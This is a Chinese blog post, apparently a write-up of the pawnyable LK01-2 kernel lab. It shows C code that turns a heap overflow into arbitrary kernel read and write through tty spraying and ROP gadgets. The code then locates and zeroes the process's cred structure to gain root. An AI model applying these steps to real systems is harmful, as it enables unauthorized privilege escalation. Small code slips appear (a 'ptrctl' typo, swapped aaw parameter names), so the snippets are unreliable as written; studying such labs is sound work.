@@ -1,0 +1,745 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="google-site-verification" content="McULNauwae3fxE8yPK3QNQNAYvG6cZAJ02xx9Lpbc98" />
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/hope.jpg">
+  <link rel="icon" href="/img/hope.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="hope">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言在之前的HeapOverflow文章中，作者还构造了任意地址读写的操作，使用了任意地址读写去进行提权，还挺有意思的，记录一下如何利用任意地址读写进行提权。 作者利用任意地址读写分别改写modprobe_path以及cred结构体去实现提权的操作，由于改写modprobe_path的方法之前已经研究过了，因此现在详细记录一下如何修改cred结构体完成提权操作。 cred结构体cred 结构体通常">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hope">
+<meta property="og:url" content="https://h0pe-ay.github.io/KernelPwn-AAR&AAW/index.html">
+<meta property="og:site_name" content="hope">
+<meta property="og:description" content="前言在之前的HeapOverflow文章中，作者还构造了任意地址读写的操作，使用了任意地址读写去进行提权，还挺有意思的，记录一下如何利用任意地址读写进行提权。 作者利用任意地址读写分别改写modprobe_path以及cred结构体去实现提权的操作，由于改写modprobe_path的方法之前已经研究过了，因此现在详细记录一下如何修改cred结构体完成提权操作。 cred结构体cred 结构体通常">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309111124487.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309111124488.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309111124490.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309111124491.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309111124492.png">
+<meta property="article:published_time" content="2023-09-11T03:23:56.220Z">
+<meta property="article:author" content="hope">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309111124487.png">
+  
+  
+  
+  <title>hope</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"h0pe-ay.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"ZqEEnP8vrF2LzEKjCt8pL5Cf-gzGzoHsz","app_key":"6Owvec9nVB4K93xxi7CKzAqh","server_url":"https://zqeenp8v.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>hope</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-11 11:23" pubdate>
+          2023年9月11日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          46 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在之前的<a target="_blank" rel="noopener" href="https://blog-wohin-me.translate.goog/posts/pawnyable-0202/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl">HeapOverflow</a>文章中，作者还构造了任意地址读写的操作，使用了任意地址读写去进行提权，还挺有意思的，记录一下如何利用任意地址读写进行提权。</p>
+<p>作者利用任意地址读写分别改写<a href="https://h0pe-ay.github.io/%E5%88%A9%E7%94%A8modprobe_path%E6%8F%90%E6%9D%83/">modprobe_path</a>以及<code>cred</code>结构体去实现提权的操作，由于改写<code>modprobe_path</code>的方法之前已经研究过了，因此现在详细记录一下如何修改<code>cred</code>结构体完成提权操作。</p>
+<h1 id="cred结构体"><a href="#cred结构体" class="headerlink" title="cred结构体"></a>cred结构体</h1><p><code>cred</code> 结构体通常出现在UNIX&#x2F;Linux操作系统内核中，用于表示进程的凭据（credentials）。这些凭据包括有关进程身份的信息，如用户ID、组ID、权限等。结构体部分成员如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br>	<span class="hljs-type">atomic_t</span>	usage;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br>	<span class="hljs-type">atomic_t</span>	subscribers;	<span class="hljs-comment">/* number of processes subscribed */</span><br>	<span class="hljs-type">void</span>		*put_addr;<br>	<span class="hljs-type">unsigned</span>	magic;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC	0x43736564</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	<span class="hljs-type">kuid_t</span>		uid;		<span class="hljs-comment">/* real UID of the task */</span><br>	<span class="hljs-type">kgid_t</span>		gid;		<span class="hljs-comment">/* real GID of the task */</span><br>	<span class="hljs-type">kuid_t</span>		suid;		<span class="hljs-comment">/* saved UID of the task */</span><br>	<span class="hljs-type">kgid_t</span>		sgid;		<span class="hljs-comment">/* saved GID of the task */</span><br>	<span class="hljs-type">kuid_t</span>		euid;		<span class="hljs-comment">/* effective UID of the task */</span><br>	<span class="hljs-type">kgid_t</span>		egid;		<span class="hljs-comment">/* effective GID of the task */</span><br>	<span class="hljs-type">kuid_t</span>		fsuid;		<span class="hljs-comment">/* UID for VFS ops */</span><br>	<span class="hljs-type">kgid_t</span>		fsgid;		<span class="hljs-comment">/* GID for VFS ops */</span><br>    ...<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure>
+
+<p>而我们在<code>ret2usr</code>的操作中，通常都为执行<code>commit_creds(prepare_kernel_cred(0))</code>，实际就是为了获取<code>root</code>的凭证，因此如果我们能过任意地址写的操作修改<code>cred</code>的结构体也同样能够实现。</p>
+<p>在<code>cred</code>的结构体存在<code>uid</code>、<code>gid</code>等标识符用于标识在系统中用于身份验证和权限控制，因此将这些标识符修改为<code>0</code>，即可将当前进程修改为<code>root</code>进程。</p>
+<p>那么该如何获取<code>cred</code>结构体的地址，则是提权的关键。这里就需要凭借任意地址读的操作。在<code>task_struct</code>中存在着<code>cred</code>结构体的指针值。并且该指针值刚好存在于<code>comm</code>变量的上方，而该变量用于存储当前的进程名。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">	<span class="hljs-comment">/* Effective (overridable) subjective task credentials (COW): */</span><br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>		*<span class="hljs-title">cred</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEYS</span><br>	<span class="hljs-comment">/* Cached requested key. */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>			*<span class="hljs-title">cached_requested_key</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * executable name, excluding path.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * - normally initialized setup_new_exec()</span><br><span class="hljs-comment">	 * - access it with [gs]et_task_comm()</span><br><span class="hljs-comment">	 * - lock it with task_lock()</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-type">char</span>				comm[TASK_COMM_LEN];<br></code></pre></td></tr></table></figure>
+
+<p>因此我们可以通过将当前的进程名设置为在内核地址中几乎不会出现的值，则可以搜索内存值找到<code>comm</code>变量的位置，那么就可以获取<code>cred</code>结构体的指针值。</p>
+<p>这里使用<code>prctl</code>函数设置进程名，<code>prctl</code> 函数是一个用于进程控制的系统调用，通常在Linux系统上可用。它允许你以不同的方式控制和查询进程的各种属性和行为。 <code>prctl</code> 函数的原型如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">prctl</span><span class="hljs-params">(<span class="hljs-type">int</span> option, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg2, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg3, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg4, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg5)</span>;<br></code></pre></td></tr></table></figure>
+
+<p><code>prctl</code> 函数是一个用于进程控制的系统调用，通常在Linux系统上可用。它允许你以不同的方式控制和查询进程的各种属性和行为。</p>
+<p><code>prctl</code> 函数的参数和行为取决于传递给它的 <code>option</code> 参数，以及可能的附加参数 <code>arg2</code> 到 <code>arg5</code>。不同的 <code>option</code> 值对应于不同的控制操作。</p>
+<p>以下是一些常见的 <code>option</code> 值和它们的用途：</p>
+<ol>
+<li><code>PR_SET_NAME</code>：设置进程的名称，可以用于在系统中标识进程。</li>
+<li><code>PR_GET_NAME</code>：获取进程的名称。</li>
+<li><code>PR_SET_PDEATHSIG</code>：设置父进程退出时发送给子进程的信号。</li>
+<li><code>PR_GET_PDEATHSIG</code>：获取父进程退出时发送给子进程的信号。</li>
+<li><code>PR_SET_SECCOMP</code>：启用或禁用Seccomp过滤器，用于限制进程对系统调用的访问。</li>
+<li><code>PR_SET_KEEPCAPS</code>：控制进程是否保留其有效用户ID的能力。</li>
+<li><code>PR_GET_KEEPCAPS</code>：获取进程是否保留其有效用户ID的能力。</li>
+<li><code>PR_SET_NO_NEW_PRIVS</code>：设置进程的<code>No New Privileges</code>标志，用于控制是否可以提升权限。</li>
+<li><code>PR_GET_NO_NEW_PRIVS</code>：获取进程的<code>No New Privileges</code>标志状态。</li>
+<li><code>PR_SET_DUMPABLE</code>：设置进程的核心转储状态。</li>
+<li><code>PR_GET_DUMPABLE</code>：获取进程的核心转储状态。</li>
+<li><code>PR_SET_CHILD_SUBREAPER</code>：设置进程是否作为子进程的子进程的领导者。</li>
+<li><code>PR_GET_CHILD_SUBREAPER</code>：获取进程是否作为子进程的子进程的领导者。</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ptrctl(PR_SET_NAME, <span class="hljs-string">&quot;XXXXXXXXX&quot;</span>); <span class="hljs-comment">//设置进程名</span><br></code></pre></td></tr></table></figure>
+
+<p>那么利用<code>cred</code>结构体的提权流程如下：</p>
+<ul>
+<li>具有任意地址读写的操作</li>
+<li>使用<code>prctl</code>函数将进程名设置为关键字</li>
+<li>使用任意地址在内核内存中搜索关键字，获取<code>cred</code>结构体的地址</li>
+<li>使用任意地址写修改<code>cred</code>结构体标识符的值，全修改为0</li>
+</ul>
+<h1 id="LK01-2"><a href="#LK01-2" class="headerlink" title="LK01-2"></a>LK01-2</h1><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/h0pe-ay/Kernel-Pwn/tree/master/LK01-2/LK01-2/qemu/AAR%26AAW">https://github.com/h0pe-ay/Kernel-Pwn/tree/master/LK01-2/LK01-2/qemu/AAR%26AAW</a></p>
+<p>题目的读写模块存在着堆溢出的漏洞，那么想要使用<code>cred</code>结构体进行提权，首先需要构造出任意地址读写的操作。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)&amp;buf[<span class="hljs-number">0x418</span>] = g_buf;<br>    p[<span class="hljs-number">0xc</span>] = <span class="hljs-number">0xaaaaaa</span>;<br>    write(fd, buf, <span class="hljs-number">0x500</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) <br>	ioctl(spray[i], <span class="hljs-number">0x1234</span>, <span class="hljs-number">0x5678</span>);<br>...<br></code></pre></td></tr></table></figure>
+
+<p>正如之前所说的，<code>ioctl</code>的参数是会传递给寄存器的，可以看到<code>ioctl</code>函数的参数对应<code>RCX</code>与<code>RSI</code>寄存器，而第三个参数对应于<code>RDX</code>寄存器。并且距离<code>g_buf</code>地址的<code>0xc</code>的位置可以劫持程序的流程。</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309111124487.png" srcset="/img/loading.gif" lazyload alt="image-20230910212533727"></p>
+<p> 那么在内核中搜索相关的<code>gadget</code>就可以构造出任意地址读写的操作。</p>
+<h2 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h2><p>这里需要注意的是<code>ioctl</code>函数的参数的字节长度是不同的，在执行<code>ioctl(spray[i], 0x1122334455667788, 0x1122334455667788)</code>时，我们同时往参数二与参数三写入<code>0x1122334455667788</code>的值，但是<code>RCX</code>寄存器值传入了4个字节，而<code>RDX</code>寄存器可以传入8个字节，因此我们需要将<code>RDX</code>寄存器作为地址，而<code>RCX</code>作为值，这是因为内核地址是占满八字节的。</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309111124488.png" srcset="/img/loading.gif" lazyload alt="image-20230910214715084"></p>
+<p>搜索的表达式为<code>cat g | grep &quot;mov .* \[rdx\];&quot;</code>，由于需要<code>rdx</code>作为地址，因此直接搜索以<code>rdx</code>作为间接寻址的操作，括号需要进行转义字符。这里我们选取<code>0xffffffff8118a285: mov eax, dword ptr [rdx]; ret;</code>作为任意地址读的<code>gadget</code>，这是因为我们可以往<code>rdx</code>填入想要读取的地址并且<code>eax</code>通常用于存储返回值，因此直接读取返回值即可获得<code>rdx</code>指向的值。</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309111124490.png" srcset="/img/loading.gif" lazyload alt="image-20230910215249576"></p>
+<p>为了加速读取，作者这里采用缓存的形式，将能够控制的<code>tty</code>结构体的文件描述符存储起来，这样在下次读取时就不用重新遍历一遍。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//0xffffffff8118a285: mov eax, dword ptr [rdx]; ret;</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">aar</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)</span><br>&#123;  <br>    <span class="hljs-type">int</span> result;<br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)&amp;buf[<span class="hljs-number">0x418</span>] = g_buf;<br>    p[<span class="hljs-number">0xc</span>] = kernel_base + op_aar;<br>    write(fd, buf, <span class="hljs-number">0x500</span>);<br>    <span class="hljs-keyword">if</span> (cache_fd == <span class="hljs-number">-1</span>)<br>    &#123;<br>	    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>	       result = ioctl(spray[i], <span class="hljs-number">0</span>, addr);<br>	       <span class="hljs-keyword">if</span> (result != <span class="hljs-number">-1</span>)<br>	       &#123;<br>	       	   cache_fd = spray[i];<br>		   <span class="hljs-keyword">return</span> result;<br>	       &#125;<br>	    &#125;   <br>    &#125;	<br>    <span class="hljs-keyword">else</span><br>    	<span class="hljs-keyword">return</span>(result = ioctl(cache_fd, <span class="hljs-number">0</span>, addr));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><p>任意地址写的<code>gadget</code>搜索思路与任意地址读一致，同样是将<code>rdx</code>作为寻址的寄存器，并且由于需要构造任意地址写，因此<code>rcx</code>寄存器则是我们想写入的值，因此搜索的表达式为<code>cat g | grep &quot;mov .* \[rdx\], rcx;&quot;</code></p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309111124491.png" srcset="/img/loading.gif" lazyload alt="image-20230910215914034"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//0xffffffff810477f7: mov qword ptr [rdx], rcx; ret; </span><br><span class="hljs-type">void</span> <span class="hljs-title function_">aaw</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> target_addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> data)</span><br>&#123;<br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)&amp;buf[<span class="hljs-number">0x418</span>] = g_buf;<br>    p[<span class="hljs-number">0xc</span>] = kernel_base + op_aaw;<br>    write(fd, buf, <span class="hljs-number">0x500</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>       ioctl(spray[i], target_addr, data);<br>    &#125;   		<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="cred结构体的搜索与改写"><a href="#cred结构体的搜索与改写" class="headerlink" title="cred结构体的搜索与改写"></a>cred结构体的搜索与改写</h2><p>首先是将当前进程名设置为一个关键字</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">prctl(PR_SET_NAME, <span class="hljs-string">&quot;h0pe-ay!&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>然后就是在内存中搜索该关键字，由于<code>task_struct</code>结构体存在于堆地址中，因此可以在堆地址中搜索。我们可以通过泄露的<code>g_buf</code>的地址，然后往前搜索，因为<code>cred</code>结构体会先于<code>g_buf</code>创建。这里需要注意的是需要将进程名改为小端，这里记录一下<code>python</code>从字符串转为16进制的脚本，因为每次都忘记了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#从字符串转化为十六进制</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>text = <span class="hljs-string">&quot;h0pe-ay!&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>hex_string = text.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).<span class="hljs-built_in">hex</span>()<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(hex_string)<br>683070652d617921<br><br><span class="hljs-comment">#从十六进制转化为16进制</span><br>hex_string = <span class="hljs-string">&quot;65703068&quot;</span><br>bytes_obj = <span class="hljs-built_in">bytes</span>.fromhex(hex_string)<br><span class="hljs-built_in">print</span>(bytes_obj)<br></code></pre></td></tr></table></figure>
+
+<p>接下来就是搜索内存了,需要注意以下几点</p>
+<ul>
+<li>使用小端序进行比较</li>
+<li>需要从<code>g_buf</code>地址往前搜索</li>
+<li>由于每次只能泄露4字节数据，因此需要泄露两次</li>
+</ul>
+<p>在成功搜索到关键字之后，<code>comm</code>的上方四字节则是用于存储<code>cred</code>结构体的指针，因此需要通过任意地址去读取指针值，同样的由于只能读取四字节，因此需要读取两次，然后使用简单的移位组合起来。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr = g_buf - <span class="hljs-number">0x1000000</span>;; addr += <span class="hljs-number">0x8</span>)<br>&#123;<br>	<span class="hljs-keyword">if</span> (aar(addr) == <span class="hljs-number">0x65703068</span> &amp;&amp; aar(addr+<span class="hljs-number">4</span>) == <span class="hljs-number">0x2179612d</span>)<br>	&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] found!\n&quot;</span>);<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr:0x%lx\n&quot;</span>, addr);<br>		cred_addr = aar(addr - <span class="hljs-number">4</span>);<br>		cred_addr = (cred_addr &lt;&lt; <span class="hljs-number">32</span>) | aar(addr - <span class="hljs-number">8</span>);<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cred_addr:0x%lx\n&quot;</span>, cred_addr);<br>		<span class="hljs-keyword">break</span>;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>最后就是改写<code>cred</code>结构体了，只需要将所有标识符修改为<code>0</code>即可,接着拿<code>shell</code>即可</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">9</span>; i++)<br>	aaw(<span class="hljs-number">0</span>, cred_addr + i*<span class="hljs-number">4</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309111124492.png" srcset="/img/loading.gif" lazyload alt="image-20230910223301496"></p>
+<p>完整exp可见<a target="_blank" rel="noopener" href="https://github.com/h0pe-ay/Kernel-Pwn/blob/master/LK01-2/LK01-2/qemu/AAR%26AAW/exp.c">https://github.com/h0pe-ay/Kernel-Pwn/blob/master/LK01-2/LK01-2/qemu/AAR%26AAW/exp.c</a></p>
